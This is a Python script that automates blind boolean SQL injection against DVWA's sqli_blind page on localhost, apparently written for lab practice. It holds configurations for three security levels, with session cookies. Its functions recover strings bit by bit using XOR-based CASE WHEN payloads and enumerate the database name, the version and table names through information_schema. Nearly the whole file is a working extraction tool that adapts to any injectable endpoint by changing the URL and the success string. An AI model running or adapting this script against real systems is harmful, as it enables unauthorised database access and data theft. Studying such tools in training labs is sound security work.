import requests
from urllib import parse
from pprint import pprint as pp

debug = True
info = True
warning = True
count = True

dvwa_low = {
    "root_url":"http://localhost/vulnerabilities/sqli_blind/?id=INJECT&Submit=Submit#",
    "root_data":{},
    "param":"id",
    "default_query":"1'",
    "method":"GET",
    "cookies":{"PHPSESSID":"o479vhchsgphvrsgijpgkptau4", "security":"low"},
    "contains":"User ID exists in the database."
}

dvwa_med = {
    "root_url":"http://localhost/vulnerabilities/sqli_blind/",
    "root_data":{"id":"INJECT", "Submit":"Submit"},
    "param":"id",
    "default_query":"1",
    "method":"POST",
    "cookies":{"PHPSESSID":"", "security":"medium"},
    "contains":"User ID exists in the database."
}

dvwa_high = {
    "root_url":"http://localhost/vulnerabilities/sqli_blind/",
    "root_data":{},
    "param":"id",
    "default_query":"1'",
    "method":"GET",
    "cookies":{"id":"INJECT", "PHPSESSID":"pmefqbdh10nntprs14e35k5246", "security":"high"},
    "contains":"User ID exists in the database."
}

scan_result = {}

setup = dvwa_high

def check_success(response):
    if setup["contains"] in response.text:
        return 1
    else:
        return 0

def sql_inject(query, data=None):
    
    if setup["method"] == "GET":
        query =  parse.quote_plus(query)
        
        if setup['cookies']['security'] != "high":
            url = setup["root_url"].replace("INJECT", query)
        else:
            url = setup['root_url']
            setup['cookies']['id'] = query
        
        response = requests.get(url, cookies=setup["cookies"])
    else:
        url = setup["root_url"]
        setup["root_data"][setup["param"]] = query
        
        response = requests.post(url, data=setup["root_data"], cookies=setup["cookies"])
        
    if debug: print(query, response)
    return check_success(response)

def result_len(query_function):
    rq_count = 0
    
    length_query = "LENGTH(%s)" %(query_function)
    init_query = "%s AND %s>9#" %(setup["default_query"], length_query)
    
    init_res = sql_inject(init_query)
    
    rq_count += 1

    if init_res:
        if count: print("[+] Result length greater than 9 so using advanced method")
        length = result_string(length_query, 1, 3, count = False)
        if count: print("[+] FOUND RESULT LENGTH IN %s REQUESTS!" %(str(rq_count+16))) 
    else:
        if count: print("[+] Result length smaller than 9 so using bruteforce method")
        length = result_len_brute(query_function, 0, 10)
        if count: print("[+] FOUND RESULT LENGTH IN %s REQUESTS!" %(str(rq_count+length)))
    
    if count: print("[+] RESULT LENGTH: %s" %(str(length)))
    return int(length)

def result_len_brute(query_function, low, high):
    rq_count = 0
    raw_query = "%s AND LENGTH(%s)=VAL#" %(setup["default_query"], query_function)
    
    for i in range(low, high):
        inject_query = raw_query.replace("VAL", str(i))
        
        response_success = sql_inject(inject_query)
        
        rq_count += 1
        
        if response_success:
            return i
    
    if warning: print("[-] Invalid Query")

def result_string(query_function, low, high, count = count):
    rq_count = 0
    
    ascii_query = "ASCII(SUBSTRING(%s,IDX,1))" %(query_function)
    raw_query = "%s AND CASE WHEN %s^XOR>%s THEN 0 ELSE 1 END#" %(setup["default_query"], ascii_query, ascii_query)
    
    name_list = []
    
    for i in range(low, high):
        curr_raw_query = raw_query.replace("IDX", str(i))
        char = ""
        
        for j in range(8):
            inject_query = curr_raw_query.replace("XOR", str(2**j))
            
            response_success = sql_inject(inject_query)
            
            rq_count += 1
            
            char = str(response_success) + char
        
        name_list.append(char)
    
    name = ""
    
    for char in name_list:
        bin_int = int(char, 2)
        name += chr(bin_int)
    
    if count: print('[+] FOUND RESULT STRING IN %s REQUESTS!' %(str(rq_count)))
    return name

def execute_query(query, opt):
    if opt not in scan_result.keys():
        length = result_len(query)
        res = result_string(query, 1, length+1)
        scan_result[opt] = res
    else:
        res = scan_result[opt]
    
    print("[+] %s : %s" %(opt, res))
    return res


query_list = {
    "database_name": "(database())",
    "table_count": "(SELECT COUNT(TABLE_NAME) FROM information_schema.tables WHERE {WHERE})",
    "version_name": "(@@version)",
    "table_name": "(SELECT TABLE_NAME FROM information_schema.tables WHERE {WHERE} ORDER BY 1 LIMIT 1 OFFSET {IDX})"
}

def table_names(where = "TRUE"):
    table_count = execute_query(query_list["table_count"].replace("{WHERE}", where), "table_count")
    for i in range(int(table_count)):
        query = query_list["table_name"].replace("{WHERE}", where).replace("{IDX}", str(i))
        execute_query(query, "table_name_%d" %(i))

